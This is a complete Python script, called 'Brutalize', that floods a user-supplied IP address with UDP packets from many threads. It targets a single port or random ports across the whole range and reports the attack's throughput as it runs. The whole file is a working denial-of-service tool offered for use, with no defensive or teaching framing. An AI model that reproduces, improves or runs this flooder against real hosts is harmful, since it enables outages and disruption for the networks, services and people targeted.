# Import required libraries
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
from getpass import getpass as hinput

# Define the Brutalize class
class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
    
    # Start flooding attack    
    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    # Display attack info    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000       
        while self.on:
            sleep(interval)
            if not self.on:
                break
            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb. {' '*20}", end='\r')
            now2 = time()      
            if now + 1 >= now2:
                continue           
            size = round(self.sent * bytediff / mb)
            self.sent = 0
            now += 1
            
    # Stop the attack        
    def stop(self):
        self.on = False
        
    # Send packets    
    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    # Generate a random address with the target IP and a random port        
    def _randaddr(self):
        return (self.ip, self._randport())
    # Generate a random port number
    def _randport(self):
        return self.port or randint(1, 65535)
# Main function to execute the script
def main():
    ip = input("Enter the IP to Brutalize: ")
    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        print("Error! Please enter a correct IP address.")
        exit()

    port = input("Enter port [press enter to attack all ports]: ")
    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            print("Error! Please enter a correct port.")
            exit()

    force = input("Bytes per packet [press enter for 1250]: ")
    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    threads = input("Threads [press enter for 100]: ")
    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    cport = '' if port is None else f':{port}'
    print(f"Starting attack on {ip}{cport}.", end='\r')
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occured and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.", '.')
    print('\n')
    input("Press enter to exit.")

if __name__ == '__main__':
    main()
